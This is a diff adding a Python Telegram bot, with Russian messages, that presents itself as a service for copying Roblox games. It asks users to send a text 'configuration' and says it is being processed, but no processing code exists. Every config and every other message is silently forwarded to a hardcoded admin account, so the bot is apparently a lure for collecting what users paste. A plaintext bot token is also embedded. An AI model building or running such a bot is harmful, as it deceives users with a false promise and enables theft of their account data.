@@ -1,0 +1,58 @@
+from telebot import TeleBot, types
+import os
+
+bot = TeleBot("8391657012:AAG0ZIXQje_01GBHTBCMlQ9omanwxtX104I")
+ADMIN_ID = 5512960388
+
+# Команда /start
+@bot.message_handler(commands=['start'])
+def start(message):
+    text = """Привет! Я бот для копирования игр Roblox.
+
+Команды:
+/copy - начать копирование
+/tutor - инструкция
+
+Отправьте конфигурацию для копирования игры!"""
+    bot.send_message(message.chat.id, text)
+
+    # Уведомление админу
+    bot.send_message(ADMIN_ID, f"🆕 Новый пользователь: {message.from_user.first_name}")
+
+# Команда /copy
+@bot.message_handler(commands=['copy'])
+def copy_cmd(message):
+    msg = bot.send_message(message.chat.id, "📝 Отправьте текст-конфигурацию:")
+    bot.register_next_step_handler(msg, process_config)
+
+# Обработка конфигурации
+def process_config(message):
+    bot.send_message(message.chat.id, "✅ Принято в обработку! 5 минут - несколько часов.")
+    bot.send_message(ADMIN_ID, f"📋 Конфиг от {message.from_user.first_name}:\n{message.text}")
+
+# Команда /tutor
+@bot.message_handler(commands=['tutor'])
+def tutor(message):
+    try:
+        bot.send_message(message.chat.id, "📹 Видео-инструкция:")
+
+        # Путь к видео файлу на PythonAnywhere
+        video_path = "/home/weizzybro/tutor.mp4"
+
+        # Открываем и отправляем видео файл
+        with open(video_path, 'rb') as video_file:
+            bot.send_video(message.chat.id, video_file, caption="Смотри видео-инструкцию по использованию бота!")
+
+    except Exception as e:
+        bot.send_message(message.chat.id, "❌ Ошибка отправки видео")
+        bot.send_message(ADMIN_ID, f"Ошибка видео: {e}")
+
+# Обработка ЛЮБОГО текста
+@bot.message_handler(content_types=['text'])
+def forward_all(message):
+    bot.send_message(ADMIN_ID, f"💬 От {message.from_user.first_name}:\n{message.text}")
+    bot.send_message(message.chat.id, "Используйте /copy для отправки конфигурации")
+
+# Запуск бота
+print("Бот запущен!")
+bot.polling()
